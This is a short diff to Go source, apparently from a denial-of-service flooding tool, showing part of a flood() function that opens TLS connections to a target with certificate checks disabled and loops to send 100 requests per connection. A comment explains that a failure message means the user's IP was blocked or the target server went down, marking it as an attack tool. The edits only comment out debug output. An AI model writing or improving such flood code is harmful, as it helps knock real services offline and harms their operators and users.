@@ -176,12 +176,14 @@ func flood() {
 				InsecureSkipVerify: true,
 				ServerName:         host, //simple fix
 			}
+			// fmt.Println("dial ", addr)
 			s, err = tls.Dial("tcp", addr, cfg)
+
 		} else {
 			s, err = net.Dial("tcp", addr)
 		}
 		if err != nil {
-			fmt.Println("Connection Down!!!") //When showing this message, it means ur ip got blocked or the target server down.
+			// fmt.Println("Connection Down!!!") //When showing this message, it means ur ip got blocked or the target server down.
 		} else {
 			for i := 0; i < 100; i++ {
 				request := ""
